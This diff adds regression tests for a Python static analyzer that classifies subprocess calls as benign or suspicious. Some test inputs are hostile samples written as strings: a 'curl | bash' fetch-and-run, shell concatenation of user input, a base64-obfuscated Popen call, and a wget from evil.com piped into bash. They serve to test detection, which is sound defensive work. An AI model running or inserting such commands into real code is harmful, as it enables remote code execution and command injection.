@@ -301,3 +301,108 @@ def stealth_exec():
     assert susp_import[0].evidence.get("module") == "subprocess"
 
 
+
+
+# ==============================================================================
+# Context-Aware Subprocess Regression Tests
+# ==============================================================================
+
+def test_subprocess_legitimate_production_code():
+    analyzer = PythonASTAnalyzer()
+    source = """
+import subprocess
+def get_locales():
+    return subprocess.run(["locale", "-a"], capture_output=True, text=True)
+
+def copy_clipboard(text):
+    p = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE)
+    p.communicate(text.encode())
+"""
+    findings = analyzer.analyze_source(source, "pandas/_config/localization.py")
+    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
+    assert len(sub_findings) == 2
+    for f in sub_findings:
+        assert f.severity == Severity.LOW
+        assert f.confidence == 0.40
+        assert f.evidence.get("pattern") == "STANDARD_SYSTEM_PROCESS"
+        assert f.evidence.get("shell") is False
+
+
+def test_subprocess_legitimate_test_files():
+    analyzer = PythonASTAnalyzer()
+    source = """
+import subprocess
+import sys
+def test_cli_execution():
+    res = subprocess.check_call([sys.executable, "-m", "pytest"])
+    out = subprocess.check_output(["git", "status"])
+"""
+    findings = analyzer.analyze_source(source, "pandas/tests/test_common.py")
+    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
+    assert len(sub_findings) == 2
+    for f in sub_findings:
+        assert f.severity == Severity.LOW
+        assert f.confidence == 0.25
+        assert f.evidence.get("pattern") == "TEST_OR_FIXTURE_PROCESS"
+        assert f.evidence.get("is_test") is True
+
+
+def test_subprocess_shell_true_with_suspicious_construction():
+    analyzer = PythonASTAnalyzer()
+    source = """
+import subprocess
+def install_hook(url):
+    subprocess.Popen(f"curl -s {url} | bash", shell=True)
+"""
+    findings = analyzer.analyze_source(source, "installer.py")
+    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
+    assert len(sub_findings) == 1
+    assert sub_findings[0].severity == Severity.HIGH
+    assert sub_findings[0].confidence == 0.90
+    assert sub_findings[0].evidence.get("pattern") == "SUSPICIOUS_COMMAND_SIGNATURE"
+
+
+def test_subprocess_attacker_controlled_arguments():
+    analyzer = PythonASTAnalyzer()
+    source = """
+import subprocess
+def run_user_cmd(user_param):
+    subprocess.run("echo " + user_param, shell=True)
+"""
+    findings = analyzer.analyze_source(source, "handler.py")
+    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
+    assert len(sub_findings) == 1
+    assert sub_findings[0].severity == Severity.HIGH
+    assert sub_findings[0].confidence == 0.85
+    assert sub_findings[0].evidence.get("pattern") == "UNSAFE_DYNAMIC_SHELL"
+
+
+def test_subprocess_obfuscated_command_execution():
+    analyzer = PythonASTAnalyzer()
+    source = """
+import subprocess
+import base64
+def hidden_payload():
+    subprocess.Popen(base64.b64decode("Y2FsYy5leGU="))
+"""
+    findings = analyzer.analyze_source(source, "stager.py")
+    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
+    assert len(sub_findings) == 1
+    assert sub_findings[0].severity == Severity.CRITICAL
+    assert sub_findings[0].confidence == 0.95
+    assert sub_findings[0].evidence.get("pattern") == "OBFUSCATED_PAYLOAD"
+
+
+def test_subprocess_download_and_execute_behavior():
+    analyzer = PythonASTAnalyzer()
+    source = """
+import os
+def download_stager():
+    os.system("wget http://evil.com/payload.sh -O /tmp/p.sh && bash /tmp/p.sh")
+"""
+    findings = analyzer.analyze_source(source, "setup.py")
+    sub_findings = [f for f in findings if f.rule_id == "PY_SUBPROCESS_SPAWN"]
+    assert len(sub_findings) == 1
+    assert sub_findings[0].severity == Severity.HIGH
+    assert sub_findings[0].confidence == 0.90
+    assert sub_findings[0].evidence.get("pattern") == "SUSPICIOUS_COMMAND_SIGNATURE"
